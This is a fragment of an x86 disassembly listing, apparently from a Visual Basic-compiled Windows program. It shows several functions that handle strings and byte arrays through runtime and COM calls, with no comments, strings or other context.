  403991:	5d                   	pop    %ebp
  403992:	66 c7 05 10 80 40 00 	movw   $0xffff,0x408010
  403999:	ff ff 
  40399b:	5b                   	pop    %ebx
  40399c:	59                   	pop    %ecx
  40399d:	c3                   	ret
  40399e:	ff 15 b8 10 40 00    	call   *0x4010b8
  4039a4:	90                   	nop
  4039a5:	90                   	nop
  4039a6:	90                   	nop
  4039a7:	90                   	nop
  4039a8:	90                   	nop
  4039a9:	90                   	nop
  4039aa:	90                   	nop
  4039ab:	90                   	nop
  4039ac:	90                   	nop
  4039ad:	90                   	nop
  4039ae:	90                   	nop
  4039af:	90                   	nop
  4039b0:	55                   	push   %ebp
  4039b1:	8b ec                	mov    %esp,%ebp
  4039b3:	83 ec 0c             	sub    $0xc,%esp
  4039b6:	68 c6 11 40 00       	push   $0x4011c6
  4039bb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4039c1:	50                   	push   %eax
  4039c2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4039c9:	83 ec 38             	sub    $0x38,%esp
  4039cc:	53                   	push   %ebx
  4039cd:	56                   	push   %esi
  4039ce:	57                   	push   %edi
  4039cf:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4039d2:	c7 45 f8 48 11 40 00 	movl   $0x401148,-0x8(%ebp)
  4039d9:	8b 55 08             	mov    0x8(%ebp),%edx
  4039dc:	33 ff                	xor    %edi,%edi
  4039de:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4039e1:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4039e4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4039e7:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4039ea:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4039ed:	89 7d cc             	mov    %edi,-0x34(%ebp)
  4039f0:	ff 15 c8 10 40 00    	call   *0x4010c8
  4039f6:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4039f9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4039fc:	50                   	push   %eax
  4039fd:	51                   	push   %ecx
  4039fe:	ff 15 8c 10 40 00    	call   *0x40108c
  403a04:	8b 1d 0c 10 40 00    	mov    0x40100c,%ebx
  403a0a:	8d 55 cc             	lea    -0x34(%ebp),%edx
  403a0d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403a10:	52                   	push   %edx
  403a11:	50                   	push   %eax
  403a12:	ff d3                	call   *%ebx
  403a14:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403a17:	51                   	push   %ecx
  403a18:	6a 01                	push   $0x1
  403a1a:	ff 15 ac 10 40 00    	call   *0x4010ac
  403a20:	83 c0 01             	add    $0x1,%eax
  403a23:	0f 80 c6 01 00 00    	jo     0x403bef
  403a29:	99                   	cltd
  403a2a:	2b c2                	sub    %edx,%eax
  403a2c:	8b f0                	mov    %eax,%esi
  403a2e:	d1 fe                	sar    $1,%esi
  403a30:	75 14                	jne    0x403a46
  403a32:	8d 55 e8             	lea    -0x18(%ebp),%edx
  403a35:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403a38:	52                   	push   %edx
  403a39:	50                   	push   %eax
  403a3a:	ff d3                	call   *%ebx
  403a3c:	68 d9 3b 40 00       	push   $0x403bd9
  403a41:	e9 73 01 00 00       	jmp    0x403bb9
  403a46:	8b ce                	mov    %esi,%ecx
  403a48:	57                   	push   %edi
  403a49:	83 e9 01             	sub    $0x1,%ecx
  403a4c:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  403a4f:	0f 80 9a 01 00 00    	jo     0x403bef
  403a55:	51                   	push   %ecx
  403a56:	6a 01                	push   $0x1
  403a58:	6a 11                	push   $0x11
  403a5a:	52                   	push   %edx
  403a5b:	6a 01                	push   $0x1
  403a5d:	68 80 00 00 00       	push   $0x80
  403a62:	ff 15 78 10 40 00    	call   *0x401078
  403a68:	83 c4 1c             	add    $0x1c,%esp
  403a6b:	83 ee 01             	sub    $0x1,%esi
  403a6e:	0f 80 7b 01 00 00    	jo     0x403bef
  403a74:	89 75 bc             	mov    %esi,-0x44(%ebp)
  403a77:	33 db                	xor    %ebx,%ebx
  403a79:	3b 5d bc             	cmp    -0x44(%ebp),%ebx
  403a7c:	0f 8f 03 01 00 00    	jg     0x403b85
  403a82:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403a85:	3b cf                	cmp    %edi,%ecx
  403a87:	74 2a                	je     0x403ab3
  403a89:	66 83 39 01          	cmpw   $0x1,(%ecx)
  403a8d:	75 24                	jne    0x403ab3
  403a8f:	8b f3                	mov    %ebx,%esi
  403a91:	8b 51 14             	mov    0x14(%ecx),%edx
  403a94:	6b f6 02             	imul   $0x2,%esi,%esi
  403a97:	8b 41 10             	mov    0x10(%ecx),%eax
  403a9a:	0f 80 4f 01 00 00    	jo     0x403bef
  403aa0:	2b f2                	sub    %edx,%esi
  403aa2:	3b f0                	cmp    %eax,%esi
  403aa4:	72 09                	jb     0x403aaf
  403aa6:	ff 15 64 10 40 00    	call   *0x401064
  403aac:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403aaf:	8b fe                	mov    %esi,%edi
  403ab1:	eb 0b                	jmp    0x403abe
  403ab3:	ff 15 64 10 40 00    	call   *0x401064
  403ab9:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403abc:	8b f8                	mov    %eax,%edi
  403abe:	85 c9                	test   %ecx,%ecx
  403ac0:	74 33                	je     0x403af5
  403ac2:	66 83 39 01          	cmpw   $0x1,(%ecx)
  403ac6:	75 2d                	jne    0x403af5
  403ac8:	8b f3                	mov    %ebx,%esi
  403aca:	8b 51 14             	mov    0x14(%ecx),%edx
  403acd:	6b f6 02             	imul   $0x2,%esi,%esi
  403ad0:	8b 41 10             	mov    0x10(%ecx),%eax
  403ad3:	0f 80 16 01 00 00    	jo     0x403bef
  403ad9:	83 c6 01             	add    $0x1,%esi
  403adc:	0f 80 0d 01 00 00    	jo     0x403bef
  403ae2:	2b f2                	sub    %edx,%esi
  403ae4:	3b f0                	cmp    %eax,%esi
  403ae6:	72 09                	jb     0x403af1
  403ae8:	ff 15 64 10 40 00    	call   *0x401064
  403aee:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403af1:	8b c6                	mov    %esi,%eax
  403af3:	eb 09                	jmp    0x403afe
  403af5:	ff 15 64 10 40 00    	call   *0x401064
  403afb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403afe:	8b 49 0c             	mov    0xc(%ecx),%ecx
  403b01:	33 d2                	xor    %edx,%edx
  403b03:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  403b06:	8b f2                	mov    %edx,%esi
  403b08:	69 f6 00 01 00 00    	imul   $0x100,%esi,%esi
  403b0e:	0f 80 db 00 00 00    	jo     0x403bef
  403b14:	33 c0                	xor    %eax,%eax
  403b16:	8a 04 39             	mov    (%ecx,%edi,1),%al
  403b19:	03 f0                	add    %eax,%esi
  403b1b:	0f 80 ce 00 00 00    	jo     0x403bef
  403b21:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  403b27:	7c 0e                	jl     0x403b37
  403b29:	68 bc 24 40 00       	push   $0x4024bc
  403b2e:	ff 15 28 10 40 00    	call   *0x401028
  403b34:	0f bf f0             	movswl %ax,%esi
  403b37:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403b3a:	85 c0                	test   %eax,%eax
  403b3c:	74 1c                	je     0x403b5a
  403b3e:	66 83 38 01          	cmpw   $0x1,(%eax)
  403b42:	75 16                	jne    0x403b5a
  403b44:	8b 50 14             	mov    0x14(%eax),%edx
  403b47:	8b 48 10             	mov    0x10(%eax),%ecx
  403b4a:	8b fb                	mov    %ebx,%edi
  403b4c:	2b fa                	sub    %edx,%edi
  403b4e:	3b f9                	cmp    %ecx,%edi
  403b50:	72 10                	jb     0x403b62
  403b52:	ff 15 64 10 40 00    	call   *0x401064
  403b58:	eb 08                	jmp    0x403b62
  403b5a:	ff 15 64 10 40 00    	call   *0x401064
  403b60:	8b f8                	mov    %eax,%edi
  403b62:	8b ce                	mov    %esi,%ecx
  403b64:	ff 15 90 10 40 00    	call   *0x401090
  403b6a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403b6d:	8b 51 0c             	mov    0xc(%ecx),%edx
  403b70:	88 04 3a             	mov    %al,(%edx,%edi,1)
  403b73:	b8 01 00 00 00       	mov    $0x1,%eax
  403b78:	03 c3                	add    %ebx,%eax
  403b7a:	70 73                	jo     0x403bef
  403b7c:	8b d8                	mov    %eax,%ebx
  403b7e:	33 ff                	xor    %edi,%edi
  403b80:	e9 f4 fe ff ff       	jmp    0x403a79
  403b85:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403b88:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403b8b:	50                   	push   %eax
  403b8c:	51                   	push   %ecx
  403b8d:	ff 15 0c 10 40 00    	call   *0x40100c
  403b93:	68 d9 3b 40 00       	push   $0x403bd9
  403b98:	eb 1f                	jmp    0x403bb9
  403b9a:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  403b9e:	74 0c                	je     0x403bac
  403ba0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  403ba3:	52                   	push   %edx
  403ba4:	6a 00                	push   $0x0
  403ba6:	ff 15 44 10 40 00    	call   *0x401044
  403bac:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403baf:	50                   	push   %eax
  403bb0:	6a 00                	push   $0x0
  403bb2:	ff 15 44 10 40 00    	call   *0x401044
  403bb8:	c3                   	ret
  403bb9:	8b 35 44 10 40 00    	mov    0x401044,%esi
  403bbf:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403bc2:	51                   	push   %ecx
  403bc3:	6a 00                	push   $0x0
  403bc5:	ff d6                	call   *%esi
  403bc7:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  403bca:	52                   	push   %edx
  403bcb:	6a 00                	push   $0x0
  403bcd:	ff d6                	call   *%esi
  403bcf:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403bd2:	ff 15 08 11 40 00    	call   *0x401108
  403bd8:	c3                   	ret
  403bd9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403bdc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403bdf:	5f                   	pop    %edi
  403be0:	5e                   	pop    %esi
  403be1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403be8:	5b                   	pop    %ebx
  403be9:	8b e5                	mov    %ebp,%esp
  403beb:	5d                   	pop    %ebp
  403bec:	c2 04 00             	ret    $0x4
  403bef:	ff 15 b8 10 40 00    	call   *0x4010b8
  403bf5:	90                   	nop
  403bf6:	90                   	nop
  403bf7:	90                   	nop
  403bf8:	90                   	nop
  403bf9:	90                   	nop
  403bfa:	90                   	nop
  403bfb:	90                   	nop
  403bfc:	90                   	nop
  403bfd:	90                   	nop
  403bfe:	90                   	nop
  403bff:	90                   	nop
  403c00:	55                   	push   %ebp
  403c01:	8b ec                	mov    %esp,%ebp
  403c03:	83 ec 08             	sub    $0x8,%esp
  403c06:	68 c6 11 40 00       	push   $0x4011c6
  403c0b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403c11:	50                   	push   %eax
  403c12:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403c19:	83 ec 44             	sub    $0x44,%esp
  403c1c:	53                   	push   %ebx
  403c1d:	56                   	push   %esi
  403c1e:	57                   	push   %edi
  403c1f:	89 65 f8             	mov    %esp,-0x8(%ebp)
  403c22:	c7 45 fc 58 11 40 00 	movl   $0x401158,-0x4(%ebp)
  403c29:	8b 7d 08             	mov    0x8(%ebp),%edi
  403c2c:	8b 1d 70 10 40 00    	mov    0x401070,%ebx
  403c32:	33 c0                	xor    %eax,%eax
  403c34:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403c37:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403c3a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403c3d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  403c40:	8b 07                	mov    (%edi),%eax
  403c42:	50                   	push   %eax
  403c43:	6a 01                	push   $0x1
  403c45:	ff d3                	call   *%ebx
  403c47:	8b 0f                	mov    (%edi),%ecx
  403c49:	8b f0                	mov    %eax,%esi
  403c4b:	51                   	push   %ecx
  403c4c:	6a 01                	push   $0x1
  403c4e:	ff 15 ac 10 40 00    	call   *0x4010ac
  403c54:	8b d6                	mov    %esi,%edx
  403c56:	8b f0                	mov    %eax,%esi
  403c58:	6a 00                	push   $0x0
  403c5a:	2b f2                	sub    %edx,%esi
  403c5c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403c5f:	0f 80 56 01 00 00    	jo     0x403dbb
  403c65:	83 c6 01             	add    $0x1,%esi
  403c68:	0f 80 4d 01 00 00    	jo     0x403dbb
  403c6e:	8b c6                	mov    %esi,%eax
  403c70:	6b c0 02             	imul   $0x2,%eax,%eax
  403c73:	0f 80 42 01 00 00    	jo     0x403dbb
  403c79:	83 e8 01             	sub    $0x1,%eax
  403c7c:	0f 80 39 01 00 00    	jo     0x403dbb
  403c82:	50                   	push   %eax
  403c83:	6a 01                	push   $0x1
  403c85:	6a 11                	push   $0x11
  403c87:	51                   	push   %ecx
  403c88:	6a 01                	push   $0x1
  403c8a:	68 80 00 00 00       	push   $0x80
  403c8f:	ff 15 78 10 40 00    	call   *0x401078
  403c95:	8b 17                	mov    (%edi),%edx
  403c97:	83 c4 1c             	add    $0x1c,%esp
  403c9a:	52                   	push   %edx
  403c9b:	6a 01                	push   $0x1
  403c9d:	ff d3                	call   *%ebx
  403c9f:	83 ee 01             	sub    $0x1,%esi
  403ca2:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403ca5:	0f 80 10 01 00 00    	jo     0x403dbb
  403cab:	89 75 b8             	mov    %esi,-0x48(%ebp)
  403cae:	33 db                	xor    %ebx,%ebx
  403cb0:	3b 5d b8             	cmp    -0x48(%ebp),%ebx
  403cb3:	0f 8f 97 00 00 00    	jg     0x403d50
  403cb9:	8b 07                	mov    (%edi),%eax
  403cbb:	85 c0                	test   %eax,%eax
  403cbd:	74 2d                	je     0x403cec
  403cbf:	66 83 38 01          	cmpw   $0x1,(%eax)
  403cc3:	75 27                	jne    0x403cec
  403cc5:	8b 75 e0             	mov    -0x20(%ebp),%esi
  403cc8:	8b 50 14             	mov    0x14(%eax),%edx
  403ccb:	8b 48 10             	mov    0x10(%eax),%ecx
  403cce:	8b fb                	mov    %ebx,%edi
  403cd0:	03 fe                	add    %esi,%edi
  403cd2:	0f 80 e3 00 00 00    	jo     0x403dbb
  403cd8:	2b fa                	sub    %edx,%edi
  403cda:	3b f9                	cmp    %ecx,%edi
  403cdc:	72 06                	jb     0x403ce4
  403cde:	ff 15 64 10 40 00    	call   *0x401064
  403ce4:	89 7d ac             	mov    %edi,-0x54(%ebp)
  403ce7:	8b 7d 08             	mov    0x8(%ebp),%edi
  403cea:	eb 09                	jmp    0x403cf5
  403cec:	ff 15 64 10 40 00    	call   *0x401064
  403cf2:	89 45 ac             	mov    %eax,-0x54(%ebp)
  403cf5:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403cf8:	85 c9                	test   %ecx,%ecx
  403cfa:	74 2a                	je     0x403d26
  403cfc:	66 83 39 01          	cmpw   $0x1,(%ecx)
  403d00:	75 24                	jne    0x403d26
  403d02:	8b f3                	mov    %ebx,%esi
  403d04:	8b 51 14             	mov    0x14(%ecx),%edx
  403d07:	6b f6 02             	imul   $0x2,%esi,%esi
  403d0a:	8b 41 10             	mov    0x10(%ecx),%eax
  403d0d:	0f 80 a8 00 00 00    	jo     0x403dbb
  403d13:	2b f2                	sub    %edx,%esi
  403d15:	3b f0                	cmp    %eax,%esi
  403d17:	72 09                	jb     0x403d22
  403d19:	ff 15 64 10 40 00    	call   *0x401064
  403d1f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403d22:	8b c6                	mov    %esi,%eax
  403d24:	eb 09                	jmp    0x403d2f
  403d26:	ff 15 64 10 40 00    	call   *0x401064
  403d2c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403d2f:	8b 17                	mov    (%edi),%edx
  403d31:	8b 75 ac             	mov    -0x54(%ebp),%esi
  403d34:	8b 49 0c             	mov    0xc(%ecx),%ecx
  403d37:	8b 52 0c             	mov    0xc(%edx),%edx
  403d3a:	8a 14 32             	mov    (%edx,%esi,1),%dl
  403d3d:	88 14 01             	mov    %dl,(%ecx,%eax,1)
  403d40:	b8 01 00 00 00       	mov    $0x1,%eax
  403d45:	03 c3                	add    %ebx,%eax
  403d47:	70 72                	jo     0x403dbb
  403d49:	8b d8                	mov    %eax,%ebx
  403d4b:	e9 60 ff ff ff       	jmp    0x403cb0
  403d50:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403d53:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403d56:	51                   	push   %ecx
  403d57:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403d5a:	c7 45 c8 11 20 00 00 	movl   $0x2011,-0x38(%ebp)
  403d61:	ff 15 f4 10 40 00    	call   *0x4010f4
  403d67:	8b d0                	mov    %eax,%edx
  403d69:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d6c:	ff 15 f0 10 40 00    	call   *0x4010f0
  403d72:	8b 55 d8             	mov    -0x28(%ebp),%edx
  403d75:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403d78:	ff 15 c8 10 40 00    	call   *0x4010c8
  403d7e:	68 a5 3d 40 00       	push   $0x403da5
  403d83:	eb 0a                	jmp    0x403d8f
  403d85:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403d88:	ff 15 08 11 40 00    	call   *0x401108
  403d8e:	c3                   	ret
  403d8f:	8d 55 e8             	lea    -0x18(%ebp),%edx
  403d92:	52                   	push   %edx
  403d93:	6a 00                	push   $0x0
  403d95:	ff 15 44 10 40 00    	call   *0x401044
  403d9b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d9e:	ff 15 08 11 40 00    	call   *0x401108
  403da4:	c3                   	ret
  403da5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403da8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403dab:	5f                   	pop    %edi
  403dac:	5e                   	pop    %esi
  403dad:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403db4:	5b                   	pop    %ebx
  403db5:	8b e5                	mov    %ebp,%esp
  403db7:	5d                   	pop    %ebp
  403db8:	c2 04 00             	ret    $0x4
  403dbb:	ff 15 b8 10 40 00    	call   *0x4010b8
  403dc1:	90                   	nop
  403dc2:	90                   	nop
  403dc3:	90                   	nop
  403dc4:	90                   	nop
  403dc5:	90                   	nop
  403dc6:	90                   	nop
  403dc7:	90                   	nop
  403dc8:	90                   	nop
  403dc9:	90                   	nop
  403dca:	90                   	nop
  403dcb:	90                   	nop
  403dcc:	90                   	nop
  403dcd:	90                   	nop
  403dce:	90                   	nop
  403dcf:	90                   	nop
  403dd0:	55                   	push   %ebp
  403dd1:	8b ec                	mov    %esp,%ebp
  403dd3:	83 ec 0c             	sub    $0xc,%esp
  403dd6:	68 c6 11 40 00       	push   $0x4011c6
  403ddb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403de1:	50                   	push   %eax
  403de2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403de9:	83 ec 50             	sub    $0x50,%esp
  403dec:	53                   	push   %ebx
  403ded:	56                   	push   %esi
  403dee:	57                   	push   %edi
  403def:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403df2:	c7 45 f8 68 11 40 00 	movl   $0x401168,-0x8(%ebp)
  403df9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403dfc:	8b c3                	mov    %ebx,%eax
  403dfe:	83 e0 01             	and    $0x1,%eax
  403e01:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e04:	83 e3 fe             	and    $0xfffffffe,%ebx
  403e07:	53                   	push   %ebx
  403e08:	89 5d 08             	mov    %ebx,0x8(%ebp)
  403e0b:	8b 0b                	mov    (%ebx),%ecx
  403e0d:	ff 51 04             	call   *0x4(%ecx)
  403e10:	a1 d0 83 40 00       	mov    0x4083d0,%eax
  403e15:	33 ff                	xor    %edi,%edi
  403e17:	3b c7                	cmp    %edi,%eax
  403e19:	89 7d e8             	mov    %edi,-0x18(%ebp)
  403e1c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  403e1f:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  403e22:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  403e25:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  403e28:	75 10                	jne    0x403e3a
  403e2a:	68 d0 83 40 00       	push   $0x4083d0
  403e2f:	68 44 2a 40 00       	push   $0x402a44
  403e34:	ff 15 bc 10 40 00    	call   *0x4010bc
  403e3a:	8b 35 d0 83 40 00    	mov    0x4083d0,%esi
  403e40:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403e43:	50                   	push   %eax
  403e44:	56                   	push   %esi
  403e45:	8b 16                	mov    (%esi),%edx
  403e47:	ff 52 14             	call   *0x14(%edx)
  403e4a:	3b c7                	cmp    %edi,%eax
  403e4c:	db e2                	fnclex
  403e4e:	7d 0f                	jge    0x403e5f
  403e50:	6a 14                	push   $0x14
  403e52:	68 34 2a 40 00       	push   $0x402a34
  403e57:	56                   	push   %esi
  403e58:	50                   	push   %eax
  403e59:	ff 15 38 10 40 00    	call   *0x401038
  403e5f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403e62:	57                   	push   %edi
  403e63:	50                   	push   %eax
  403e64:	8b f0                	mov    %eax,%esi
  403e66:	8b 08                	mov    (%eax),%ecx
  403e68:	ff 51 7c             	call   *0x7c(%ecx)
  403e6b:	3b c7                	cmp    %edi,%eax
  403e6d:	db e2                	fnclex
  403e6f:	7d 0f                	jge    0x403e80
  403e71:	6a 7c                	push   $0x7c
  403e73:	68 54 2a 40 00       	push   $0x402a54
  403e78:	56                   	push   %esi
  403e79:	50                   	push   %eax
  403e7a:	ff 15 38 10 40 00    	call   *0x401038
  403e80:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403e83:	ff 15 0c 11 40 00    	call   *0x40110c
  403e89:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  403e8c:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403e8f:	c7 45 bc 68 2a 40 00 	movl   $0x402a68,-0x44(%ebp)
  403e96:	c7 45 b4 08 00 00 00 	movl   $0x8,-0x4c(%ebp)
  403e9d:	ff 15 e8 10 40 00    	call   *0x4010e8
  403ea3:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403ea6:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403ea9:	52                   	push   %edx
  403eaa:	50                   	push   %eax
  403eab:	ff 15 40 10 40 00    	call   *0x401040
  403eb1:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403eb4:	51                   	push   %ecx
  403eb5:	ff 15 18 10 40 00    	call   *0x401018
  403ebb:	8b d0                	mov    %eax,%edx
  403ebd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403ec0:	ff 15 f0 10 40 00    	call   *0x4010f0
  403ec6:	8b d0                	mov    %eax,%edx
  403ec8:	8d 4b 38             	lea    0x38(%ebx),%ecx
  403ecb:	ff 15 c8 10 40 00    	call   *0x4010c8
  403ed1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403ed4:	ff 15 08 11 40 00    	call   *0x401108
  403eda:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  403edd:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403ee0:	52                   	push   %edx
  403ee1:	50                   	push   %eax
  403ee2:	6a 02                	push   $0x2
  403ee4:	ff 15 1c 10 40 00    	call   *0x40101c
  403eea:	83 c4 0c             	add    $0xc,%esp
  403eed:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403ef0:	68 1e 3f 40 00       	push   $0x403f1e
  403ef5:	eb 26                	jmp    0x403f1d
  403ef7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403efa:	ff 15 08 11 40 00    	call   *0x401108
  403f00:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403f03:	ff 15 0c 11 40 00    	call   *0x40110c
  403f09:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403f0c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403f0f:	51                   	push   %ecx
  403f10:	52                   	push   %edx
  403f11:	6a 02                	push   $0x2
  403f13:	ff 15 1c 10 40 00    	call   *0x40101c
  403f19:	83 c4 0c             	add    $0xc,%esp
  403f1c:	c3                   	ret
  403f1d:	c3                   	ret
  403f1e:	8b 45 08             	mov    0x8(%ebp),%eax
  403f21:	50                   	push   %eax
  403f22:	8b 08                	mov    (%eax),%ecx
  403f24:	ff 51 08             	call   *0x8(%ecx)
  403f27:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f2a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403f2d:	5f                   	pop    %edi
  403f2e:	5e                   	pop    %esi
  403f2f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403f36:	5b                   	pop    %ebx
  403f37:	8b e5                	mov    %ebp,%esp
  403f39:	5d                   	pop    %ebp
  403f3a:	c2 04 00             	ret    $0x4
  403f3d:	90                   	nop
  403f3e:	90                   	nop
  403f3f:	90                   	nop
  403f40:	55                   	push   %ebp
  403f41:	8b ec                	mov    %esp,%ebp
  403f43:	83 ec 0c             	sub    $0xc,%esp
  403f46:	68 c6 11 40 00       	push   $0x4011c6
  403f4b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403f51:	50                   	push   %eax
  403f52:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403f59:	83 ec 70             	sub    $0x70,%esp
  403f5c:	53                   	push   %ebx
  403f5d:	56                   	push   %esi
  403f5e:	57                   	push   %edi
  403f5f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403f62:	c7 45 f8 78 11 40 00 	movl   $0x401178,-0x8(%ebp)
  403f69:	8b 75 08             	mov    0x8(%ebp),%esi
  403f6c:	8b c6                	mov    %esi,%eax
  403f6e:	83 e0 01             	and    $0x1,%eax
  403f71:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f74:	83 e6 fe             	and    $0xfffffffe,%esi
  403f77:	56                   	push   %esi
  403f78:	89 75 08             	mov    %esi,0x8(%ebp)
  403f7b:	8b 0e                	mov    (%esi),%ecx
  403f7d:	ff 51 04             	call   *0x4(%ecx)
  403f80:	8b 16                	mov    (%esi),%edx
  403f82:	33 ff                	xor    %edi,%edi
  403f84:	56                   	push   %esi
  403f85:	89 7d d8             	mov    %edi,-0x28(%ebp)
  403f88:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  403f8b:	89 7d d0             	mov    %edi,-0x30(%ebp)
  403f8e:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  403f91:	89 7d c0             	mov    %edi,-0x40(%ebp)
  403f94:	89 7d bc             	mov    %edi,-0x44(%ebp)
  403f97:	89 7d b8             	mov    %edi,-0x48(%ebp)
  403f9a:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  403f9d:	89 7d b0             	mov    %edi,-0x50(%ebp)
  403fa0:	89 7d ac             	mov    %edi,-0x54(%ebp)
  403fa3:	89 7d a8             	mov    %edi,-0x58(%ebp)
  403fa6:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  403fa9:	89 7d a0             	mov    %edi,-0x60(%ebp)
  403fac:	ff 92 08 03 00 00    	call   *0x308(%edx)
  403fb2:	50                   	push   %eax
  403fb3:	8d 45 a8             	lea    -0x58(%ebp),%eax
  403fb6:	50                   	push   %eax
  403fb7:	ff 15 48 10 40 00    	call   *0x401048
  403fbd:	8b d8                	mov    %eax,%ebx
  403fbf:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  403fc2:	52                   	push   %edx
  403fc3:	53                   	push   %ebx
  403fc4:	8b 0b                	mov    (%ebx),%ecx
  403fc6:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  403fcc:	3b c7                	cmp    %edi,%eax
  403fce:	db e2                	fnclex
  403fd0:	7d 12                	jge    0x403fe4
  403fd2:	68 a0 00 00 00       	push   $0xa0
  403fd7:	68 84 2a 40 00       	push   $0x402a84
  403fdc:	53                   	push   %ebx
  403fdd:	50                   	push   %eax
  403fde:	ff 15 38 10 40 00    	call   *0x401038
  403fe4:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403fe7:	50                   	push   %eax
  403fe8:	68 84 23 40 00       	push   $0x402384
  403fed:	ff 15 68 10 40 00    	call   *0x401068
  403ff3:	8b d8                	mov    %eax,%ebx
  403ff5:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403ff8:	f7 db                	neg    %ebx
  403ffa:	1b db                	sbb    %ebx,%ebx
  403ffc:	f7 db                	neg    %ebx
  403ffe:	f7 db                	neg    %ebx
  404000:	ff 15 08 11 40 00    	call   *0x401108
  404006:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404009:	ff 15 0c 11 40 00    	call   *0x40110c
  40400f:	66 3b df             	cmp    %di,%bx
  404012:	0f 84 13 03 00 00    	je     0x40432b
  404018:	8b 0e                	mov    (%esi),%ecx
  40401a:	56                   	push   %esi
  40401b:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  404021:	8b 1d 48 10 40 00    	mov    0x401048,%ebx
  404027:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40402a:	50                   	push   %eax
  40402b:	52                   	push   %edx
  40402c:	ff d3                	call   *%ebx
